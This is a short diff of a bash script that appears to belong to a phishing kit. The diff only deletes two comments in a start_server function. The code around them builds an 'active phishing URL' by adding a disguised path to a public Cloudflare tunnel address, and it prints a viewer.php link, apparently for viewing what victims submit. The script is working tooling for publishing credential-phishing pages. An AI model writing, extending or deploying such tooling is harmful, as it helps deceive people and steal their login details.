@@ -219,7 +219,6 @@ start_server() {
         if [[ -n "$CF_URL" ]]; then
             local phish_path
             phish_path=$(generate_phish_url "$SITE_NAME")
-            # Active phishing URL = real tunnel URL + phishy path (router.php redirects to template)
             local active_phish_url="${CF_URL}/${phish_path}/"
             local viewer_link="${CF_URL}/viewer.php"
             echo
@@ -243,7 +242,6 @@ start_server() {
     echo -e "${GREEN}[+]${RESET} Press ${BOLD}Ctrl+C${RESET} to stop."
     echo
 
-    # Cleanup function
     cleanup() {
         echo -e "\n${CYAN}[~]${RESET} Shutting down..."
         [[ -n "$PHP_PID" ]] && kill "$PHP_PID" 2>/dev/null
